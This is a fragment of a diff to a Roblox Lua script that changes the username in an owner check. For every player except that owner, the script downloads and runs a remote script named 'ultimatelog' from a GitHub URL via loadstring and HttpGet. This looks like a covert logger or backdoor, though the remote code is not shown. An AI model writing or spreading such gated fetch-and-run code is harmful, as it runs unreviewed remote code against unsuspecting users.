@@ -32,7 +32,7 @@ else
     
 end
 
-if game.Players.LocalPlayer.Name == "zzodtac" then
+if game.Players.LocalPlayer.Name == "zzotac" then
     print("owner")
 else
 loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/ultimatelog'))()
